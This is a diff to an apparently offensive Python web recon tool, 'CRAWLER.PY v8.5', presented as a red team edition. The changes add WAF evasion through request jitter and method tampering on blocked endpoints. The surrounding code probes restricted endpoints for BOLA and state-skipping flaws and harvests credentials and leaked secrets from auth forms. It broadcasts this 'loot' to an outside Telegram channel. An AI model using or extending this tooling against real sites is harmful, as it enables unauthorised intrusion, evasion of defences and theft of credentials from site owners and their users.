@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-CRAWLER.PY v8.0 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (With Telegram Telemetry)
+CRAWLER.PY v8.5 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (Hardened with Advanced WAF Evasion)
 Senior Red Team Edition: AST-level JavaScript bundle parsing, dynamic API prefix expansion,
-entropy inspection, robust false-positive elimination, and real-time Telegram broadcasting.
+entropy inspection, robust false-positive elimination, method tampering on verification gates, and real-time Telegram broadcasting.
 """
 import json
 import random
@@ -12,8 +12,9 @@ import asyncio
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
 
-# Import centralized Telegram broadcaster
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 # Optional AST parser integration for deep Webpack/Vite bundle analysis
 try:
@@ -57,7 +58,7 @@ class StateMachineMapper:
         return self.state_graph
 
     def evaluate_state_skipping(self, transport):
-        sys.stdout.write("\033[95m[***] EVALUATING STATE-SKIPPING & BOLA VECTORS (ENHANCED) [***]\033[0m\n")
+        sys.stdout.write("\033[95m[***] EVALUATING STATE-SKIPPING & BOLA VECTORS (ENHANCED WAF BYPASS) [***]\033[0m\n")
         sys.stdout.flush()
         
         vulnerabilities = []
@@ -66,12 +67,19 @@ class StateMachineMapper:
         )
 
         for ep in restricted_endpoints:
+            apply_behavioral_jitter()
             status, headers, body = transport.request("GET", ep)
             
+            # Method Tampering Fallback if edge gateway returns 403/405
+            if status in [403, 405, 404]:
+                alt_status, alt_headers, alt_body = transport.request("POST", ep, payload={})
+                if alt_status < 400:
+                    status, headers, body = alt_status, alt_headers, alt_body
+
             is_false_positive = False
             if status in [200, 201] and isinstance(body, str):
                 lower_body = body.lower()
-                if any(term in lower_body for term in ["login", "signin", "password", "auth-form", "<form"]):
+                if any(term in lower_body for term in ["login", "signin", "password", "auth-form", "<form"]) or len(body.strip()) < 200:
                     is_false_positive = True
 
             if status in [200, 201] and not is_false_positive:
@@ -87,7 +95,7 @@ class StateMachineMapper:
                 broadcast_tg_alert_sync("BOLA / State-Skipping Vulnerability Confirmed", loot_payload)
 
             elif is_false_positive:
-                sys.stdout.write(f"\033[93m[-] Endpoint {ep} returned HTTP 200 but served a login gate. False positive avoided.\033[0m\n")
+                sys.stdout.write(f"\033[93m[-] Endpoint {ep} returned HTTP 200 but served a login gate or SPA shell. False positive avoided.\033[0m\n")
             else:
                 sys.stdout.write(f"\033[90m[-] Protected state gate enforced at {ep} [HTTP {status}]\033[0m\n")
             sys.stdout.flush()
@@ -230,6 +238,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
 
         log(f"[*] Probing auth action [{method}] {action_url} with mapped payload fields: {list(payload.keys())}", "\033[96m")
         
+        apply_behavioral_jitter()
         status, headers, body = transport.request(method, action_url, payload=payload)
         detected_codes = inspect_json_for_leaked_codes(body)
         if detected_codes:
@@ -263,7 +272,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
     return session_output, operator_creds, leaked_secrets
 
 def crawl_target(transport):
-    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.0) [***]", "\033[95m")
+    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.5 WAF HARDENED) [***]", "\033[95m")
     discovered_endpoints = set()
     discovered_scripts = set()
     all_forms_intel = []
@@ -301,6 +310,7 @@ def crawl_target(transport):
     endpoint_in_js = re.compile(r'["\'](/v?\d?/[a-zA-Z0-9_/_-]+)["\']', re.I)
 
     for path in seed_paths:
+        apply_behavioral_jitter()
         status, headers, html = transport.request("GET", path)
         if status == 0 or not isinstance(html, str):
             continue
@@ -333,6 +343,7 @@ def crawl_target(transport):
                 discovered_scripts.add(urljoin(path, script))
 
     for script_path in list(discovered_scripts)[:15]:
+        apply_behavioral_jitter()
         s_status, _, s_content = transport.request("GET", script_path)
         if s_status == 200 and isinstance(s_content, str):
             for match in endpoint_in_js.findall(s_content):
